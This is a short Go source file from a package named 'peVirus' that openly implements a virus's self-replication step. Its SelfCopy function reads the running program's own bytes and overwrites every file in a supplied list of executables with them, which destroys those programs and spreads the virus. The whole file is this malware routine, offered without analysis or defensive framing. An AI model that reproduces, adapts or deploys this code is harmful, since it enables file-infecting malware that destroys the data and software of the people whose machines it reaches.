package peVirus

import (
	"bufio"
	"os"
)

func copyvirus(fileName string, virusFile []byte) {
	fd, _ := os.OpenFile(fileName, os.O_WRONLY, 0666)
	defer fd.Close()
	write := bufio.NewWriter(fd)
	write.Write(virusFile)
	write.Flush()
}

func SelfCopy(x64file []string, selfname string) {
	fd, _ := os.Open(selfname)
	defer fd.Close()
	getInfo, _ := fd.Stat()
	getLen := getInfo.Size()
	virusBytes := make([]byte, getLen)
	fd.Read(virusBytes)
	for _, _file := range x64file {
		copyvirus(_file, virusBytes)
	}
}
